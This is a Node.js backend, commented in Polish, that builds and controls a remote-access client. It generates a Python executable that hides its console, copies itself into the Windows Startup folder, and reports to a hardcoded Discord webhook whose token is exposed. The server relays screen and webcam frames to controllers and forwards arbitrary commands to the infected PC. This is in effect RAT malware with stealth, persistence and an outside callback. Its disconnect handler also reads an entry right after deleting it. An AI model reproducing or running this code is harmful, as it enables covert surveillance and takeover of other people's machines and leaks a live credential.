const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { spawn } = require('child_process');
const fs = require('fs');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 1e8 });

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1395555202001539092/SyTWjng_alB0tJCtmLiDBLF7u8b4C-iMLiQ8SV_pHF_4M-ueucf62EWRzcU1iGEkhJK2"; // <-- PODMIEN NA SWOJ!

app.use(cors());
app.use(express.json());
app.use(express.static('public')); // frontend (opcjonalnie)

let pcs = {}; // {key: {socketId, controllers: []}}

// API: Generowanie .exe z kluczem
app.post('/api/build_exe', (req, res) => {
    const key = req.body.key || crypto.randomBytes(4).toString('hex');
    // Plik klienta python generowany "on-the-fly":
    const src = `
import os, sys, ctypes, requests
key = "${key}"
WEBHOOK = "${DISCORD_WEBHOOK}"
def hide_console():
    if sys.platform.startswith('win'):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
def create_autostart():
    if sys.platform.startswith('win'):
        autostart = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'remote_app.exe')
        if not os.path.exists(autostart):
            import shutil
            shutil.copy(sys.argv[0], autostart)
def notify_discord(event):
    try: requests.post(WEBHOOK, json={"content":f"{event}: {key}"})
    except: pass
print(f"Twój klucz: {key}")
notify_discord("Aktywacja klienta")
hide_console()
create_autostart()
# ... tutaj kod klienta PC z obsługą Socket.IO, funkcji sterowania itd. ...
`;
    fs.writeFileSync('client_temp.py', src);
    // PyInstaller musi być zainstalowany na serwerze!
    const build = spawn('pyinstaller', ['--onefile', '--noconsole', 'client_temp.py']);
    build.on('close', () => {
        // Po spakowaniu .exe wysyłamy użytkownikowi
        const exe = fs.readFileSync('dist/client_temp.exe');
        res.setHeader('Content-Type', 'application/octet-stream');
        res.setHeader('Content-Disposition', 'attachment; filename=remote_client.exe');
        res.send(exe);
        // Sprzątanie
        fs.rmSync('client_temp.py');
        fs.rmSync('dist', { recursive: true, force: true });
        fs.rmSync('build', { recursive: true, force: true });
        fs.rmSync('client_temp.spec');
    });
});

// API do playit.gg nie jest potrzebne – wystarczy przekierować port 3000 na VPS przez playit.gg
// Hostujesz backend na VPS, uruchamiasz klienta playit.gg, tworzysz tunel na port 3000. Podajesz host:port w panelu frontend.

io.on('connection', (socket) => {
    // PC rejestruje się (np. po uruchomieniu klienta)
    socket.on('register_pc', ({key}) => {
        pcs[key] = {socketId: socket.id, controllers: []};
        sendDiscord(`PC z kluczem ${key} podłączony`);
    });
    // Kontroler łączy się przez klucz
    socket.on('connect_with_key', ({key}) => {
        if (pcs[key]) {
            pcs[key].controllers.push(socket.id);
            socket.emit('connected_to_pc', {key});
            sendDiscord(`Kontroler połączony z kluczem ${key}`);
        } else {
            socket.emit('error', 'Nieprawidłowy klucz');
        }
    });
    // Przesyłanie obrazu ekranu/kamerki
    socket.on('screen_update', ({key, img}) => {
        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('screen_frame', img));
    });
    socket.on('camera_update', ({key, img}) => {
        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('camera_frame', img));
    });
    // Komendy sterujące
    socket.on('control_command', ({key, command, data}) => {
        if (pcs[key]) io.to(pcs[key].socketId).emit('execute_command', {command, data});
    });
    // Status, powiadomienia, inne eventy
    socket.on('status', ({key, msg}) => {
        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('status', msg));
    });
    socket.on('notify', ({key, msg}) => {
        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('notify', msg));
    });
    socket.on('disconnect', () => {
        Object.keys(pcs).forEach(key => {
            if (pcs[key].socketId === socket.id) delete pcs[key];
            pcs[key].controllers = pcs[key].controllers.filter(cid => cid !== socket.id);
        });
    });
});

// Discord Webhook (powiadomienia)
function sendDiscord(msg) {
    try {
        require('node-fetch')(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: msg })
        });
    } catch(e){}
}

server.listen(3000, () => {
    console.log('Backend działa na porcie 3000');
});
